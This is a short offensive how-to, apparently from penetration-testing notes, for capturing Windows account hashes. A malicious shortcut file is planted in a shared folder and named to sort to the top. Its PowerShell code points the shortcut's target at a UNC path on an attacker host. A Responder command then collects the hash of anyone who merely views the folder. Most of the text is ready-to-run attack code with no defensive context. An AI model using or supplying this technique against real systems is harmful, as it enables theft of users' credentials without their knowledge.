Create/Place a malicious .lnk file (shortcut) in a shared folder that, when seen (not clicked), sends a hash to the malicious actor. Naming the file with an "@" or "~" at the start of the filename bumps it to the top of the folder in a GUI view.
# How to do it
## Step 1: 
Create the file in Powershell. Replace "[ATTACKER IP]".
```powershell
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\[ATTACKER IP]\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```
## Step 2
Transfer the file onto the victim machine (if it wasn't created) and move it to a shared folder.
## Step 3: Run responder on attack machine.
```bash
sudo responder -I eth0 -P
```
Once the file is viewed, responder should pick up the hash of the account viewing it.
